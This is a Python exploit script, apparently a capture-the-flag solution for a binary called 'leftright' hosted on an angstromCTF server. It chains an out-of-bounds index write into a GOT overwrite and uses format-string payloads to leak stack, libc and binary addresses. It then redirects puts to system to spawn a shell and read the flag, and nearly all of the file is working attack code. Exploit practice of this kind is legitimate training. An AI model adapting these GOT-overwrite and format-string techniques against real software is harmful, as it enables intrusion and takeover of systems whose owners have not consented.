#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './leftright'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
# 'b *main+0x61\nb *main+0x1b2\nc\nset {int16_t}($rbp-0x2e)=-0x80\ndisable 1'
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'challs.actf.co', 'port':31324})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)
ofs_plt_printf      = binf.plt['printf']
ofs_main            = binf.sep_function['main']

ofs_got_puts        = binf.got['puts']
ofs_got_exit        = binf.got['exit']
ofs_arr             = binf.symbols['arr']

libc = ELF(env.libc) if env.libc else binf.libc
ofs_libc_write          = libc.sep_function['write']

#==========

def attack(conn, **kwargs):
    lr = LeftRight(conn)

    lr.set_name(b'a'*8)

    lr.inc_idx((ofs_got_puts - ofs_arr) & ((1<<16)-1))
    lr.set_num(ofs_plt_printf & 0xff)

    lr.inc_idx(((ofs_got_exit - ofs_got_puts) & ((1<<16)-1)) - 1)
    lr.set_bytes(p16((ofs_main & ((1<<16)-1)) + 0x4000))

    lr.inc_idx(((ofs_arr - ofs_got_exit) & ((1<<16)-1)) - 2)
    lr.exit_if_zero()

    lr.set_name(b'%p %3$p %13$p')
    leak = list(map(lambda x: int(x, 16), lr.bye().split()))

    addr_stack = leak[0]
    info('addr_stack        = 0x{:012x}'.format(addr_stack))

    addr_libc_write = leak[1] - 0x17
    libc.address = addr_libc_write - ofs_libc_write
    info('addr_libc_base    = 0x{:012x}'.format(libc.address))
    addr_libc_system    = libc.sep_function['system']

    addr_main = leak[2] - 0xe3
    binf.address = addr_main - ofs_main
    info('addr_binf_base    = 0x{:012x}'.format(binf.address))

    lr.exit_if_zero()
    lr.set_name(b'/bin/sh\x00')

    lr.exit_if_zero()
    lr.set_name(p64(addr_stack + 0x2122))
    lr.exit_if_zero()
    lr.set_name(f'%{(ofs_got_puts - ofs_arr) & 0xff}c%16$hhn'.encode())
    lr.exit_if_zero()
    lr.set_name(p64(addr_stack + 0x2123))
    lr.exit_if_zero()
    lr.set_name(f'%{0xff}c%16$hhn'.encode())

    lr.bye()
    lr.bye()
    lr.bye()
    lr.bye()

    lr.set_bytes(p64(addr_libc_system))
    lr.bye()

    conn.sendline(b'cat *flag*')

class LeftRight:
    def __init__(self, conn):
        self.recv           = conn.recv
        self.clean          = conn.clean
        self.recvuntil      = conn.recvuntil
        self.recvline       = conn.recvline
        self.unrecv         = conn.unrecv
        self.send           = conn.send
        self.sendline       = conn.sendline
        self.sendafter      = conn.sendafter
        self.sendlineafter  = conn.sendlineafter

    def set_name(self, name):
        self.sendlineafter(b'Name: ', name)

    def exit_if_zero(self):
        self.sendline(b'0')

    def inc_idx(self, n=1):
        if n > 0x1000:
            with log.progress('Progress ') as p:
                for i in range(n//0x1000):
                    p.status(f'{i*0x1000:x}/{n:x}')
                    self.send(b'1\n'*0x1000)
                    self.recv()
                    self.clean()

        self.send(b'1\n'*(n%0x1000))
        self.recv()
        self.clean()

    def set_num(self, n, inc=True):
        self.sendline(b'2\n'+p8(n))
        self.recvline()
        if inc:
            self.inc_idx()

    def bye(self):
        self.sendline(b'3')
        self.recvuntil(b'bye')
        return self.recvline()

    def set_bytes(self, data, inc=True):
        for i in range(len(data)-1):
            self.set_num(data[i])
        self.set_num(data[-1], inc)

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.bruteforce(attack)
    comn.interactive()
    # actf{left_right_left_right_lets_ride}

if __name__=='__main__':
    main()

#==========
